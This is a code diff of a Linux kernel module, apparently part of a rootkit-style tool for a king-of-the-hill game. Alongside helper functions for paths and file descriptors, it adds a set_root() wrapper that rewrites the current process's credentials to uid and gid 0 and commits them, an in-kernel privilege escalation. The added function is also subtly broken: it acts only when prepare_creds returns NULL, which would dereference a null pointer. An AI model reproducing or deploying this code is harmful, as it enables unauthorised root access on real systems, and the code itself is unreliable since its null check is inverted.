@@ -8,24 +8,30 @@
 
 /* Cleanup fops struct*/
 static void cleanup_fops(struct file_operations *fops) {
-    kfree(fops); 
-    fops = NULL; // prevent dangling pointer access
+    kfree(fops);
 }
 
-/* Checks if path doesn't match KING_FILENAME and return immediately*/
-static long is_bad_path(const char *full_path, const char *target, size_t n) {
-    if (strncmp(full_path, target, n) != 0) {
+/* Checks if path matches target */
+short is_bad_path(const char *full_path, const char *target, size_t n) {
+    size_t fp_len;
+    size_t t_len;
+    if (!full_path || !target) {
+        return 1; // pointer is NULL
+    }
+    // simple bounds checking
+    fp_len = strlen(full_path);
+    t_len = strlen(target);
+
+    if (n > fp_len || n > t_len) {
         return 1;
     }
-    return 0;
+
+    return strncmp(full_path, target, n) != 0;
 }
 
 /* Checks if file descriptor (fd) is standard (STDOUT, STDERR, STDIN)*/
-static long is_bad_fd(const int fd) {
-    if (fd < 3) { // 0, 1, 2
-        return 1;
-    }
-    return 0;
+short is_bad_fd(const int fd) {
+    return fd < 3;
 }
 
 /* Set given credentials to root (does not commit creds for you!) */
@@ -34,4 +40,17 @@ void __set_root_creds(struct cred *cred) {
     cred->euid.val = cred->egid.val = 0;
     cred->suid.val = cred->sgid.val = 0;
     cred->fsuid.val = cred->fsgid.val = 0;
+}
+
+/* Wrapper for __set_root_creds */
+void set_root(void)
+{
+    struct cred *root;
+    root = prepare_creds();
+
+    if (root == NULL) {
+        // Set credentials to root
+        __set_root_creds(root);
+        commit_creds(root);
+    }
 }
